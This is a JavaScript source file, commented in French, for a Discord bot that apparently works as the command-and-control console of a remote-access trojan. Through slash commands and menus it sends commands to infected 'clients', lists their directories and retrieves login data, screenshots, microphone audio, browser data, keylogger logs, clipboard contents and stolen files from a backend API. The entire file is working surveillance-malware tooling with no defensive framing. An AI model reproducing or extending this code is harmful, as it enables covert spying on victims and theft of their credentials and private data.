import {Client, GatewayIntentBits} from 'discord.js';

import config from './static/config.json' assert {type: 'json'};

import {fetchDataAndUpdateInteraction, handleFileResponse} from "./utils/data.js";
import {refreshTokenIfNeeded} from "./utils/token.js";
import {
    handleClientsCommand,
    handleHelpCommand,
    handleListDataCommand,
    handleListDirectoriesClientCommand,
    handleLivestreamCommand,
    handleStopLivestreamCommand,
    handleSendCommand,
    handleGetLoginDataCommand
} from "./utils/handleCommands.js";

const {TOKEN, API_BASE_URL} = config;

const client = new Client({intents: [GatewayIntentBits.Guilds]});

// Démarrage du bot
client.on('ready', async () => {
    console.log(`Connecté en tant que ${client.user.tag}!`);
    await refreshTokenIfNeeded();
    client.user.setActivity('/help');
});

// Gestion des commandes
client.on('interactionCreate', async interaction => {
    if (interaction.isChatInputCommand()) {
        switch (interaction.commandName) {
            case 'help':
                await handleHelpCommand(interaction); // Gestion de la commande /help
                break;
            case 'command':
                await handleSendCommand(interaction); // Gestion de la commande /command
                break;
            case 'list_data':
                await handleListDataCommand(interaction); // Gestion de la commande /list_data
                break;
            case 'live_stream':
                await handleLivestreamCommand(interaction); // Gestion de la commande /live_stream
                break;
            case 'stop_stream':
                await handleStopLivestreamCommand(interaction); // Gestion de la commande /stop_stream
                break;
            case 'clients':
                await handleClientsCommand(interaction); // Gestion de la commande /clients
                break;
            case 'list_directories_client':
                await handleListDirectoriesClientCommand(interaction); // Gestion de la commande /list_directories_client
                break;
            case 'get_login_data':
                await handleGetLoginDataCommand(interaction); // Gestion de la commande /get_login_data
                break;
        }
    } else if (interaction.isButton()) { // Gestion des boutons
        const [type, clientId, browser] = interaction.customId.split('_'); // Exemple : select_screenshot_1
        if (type !== 'next' && type !== 'previous') { // Gestion des boutons de navigation
            await fetchDataAndUpdateInteraction(type, interaction, clientId, browser);
        }

    }

    // Gestion des menus déroulants

    else if (interaction.customId === "select_screenshot") {
        const screenshotId = interaction.values[0];
        const endpoint = `${API_BASE_URL}/screenshot/image/${screenshotId}`;
        const fileName = "screenshot.png";
        await handleFileResponse(interaction, endpoint, fileName, "", 'image');

    } else if (interaction.customId === "select_microphone") {
        const microphoneId = interaction.values[0];
        const endpoint = `${API_BASE_URL}/microphone/audio/${microphoneId}`;
        const fileName = `audio_${microphoneId}.wav`;
        await handleFileResponse(interaction, endpoint, fileName, "Voici l'enregistrement audio :", 'audio');

    } else if (interaction.customId === "select_browserdata") {
        let [browserDataId, filename] = interaction.values[0].split('_');
        if (!filename.includes('.')) {
            filename += '.txt';
        }
        const endpoint = `${API_BASE_URL}/browser/data/${browserDataId}`;
        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');

    } else if (interaction.customId === "select_keylogger") {
        const [keyloggerDataId, filename] = interaction.values[0].split('_');
        const endpoint = `${API_BASE_URL}/keylogger/log/${keyloggerDataId}`;
        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');

    } else if (interaction.customId === "select_clipboard") {
        const [clipboardDataId, filename] = interaction.values[0].split('_');
        const endpoint = `${API_BASE_URL}/clipboard/content/${clipboardDataId}`;
        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');

    } else if (interaction.customId === "select_downloadfile") {
        const [downloadFileId, filename] = interaction.values[0].split('_');
        const endpoint = `${API_BASE_URL}/download/file/${downloadFileId}`;
        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
    }

});

client.login(TOKEN).then(r => console.log("Bot démarré avec succès !"));